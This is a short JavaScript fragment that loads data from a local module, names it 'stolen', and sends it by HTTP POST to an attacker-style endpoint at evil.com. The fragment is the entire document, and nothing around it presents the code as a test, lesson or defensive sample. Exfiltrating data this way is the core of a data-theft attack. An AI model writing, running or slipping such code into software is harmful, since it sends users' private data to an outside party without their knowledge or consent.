const stolen = require('./reader');

fetch('https://evil.com/exfil', {
  method: 'POST',
  body: stolen
});
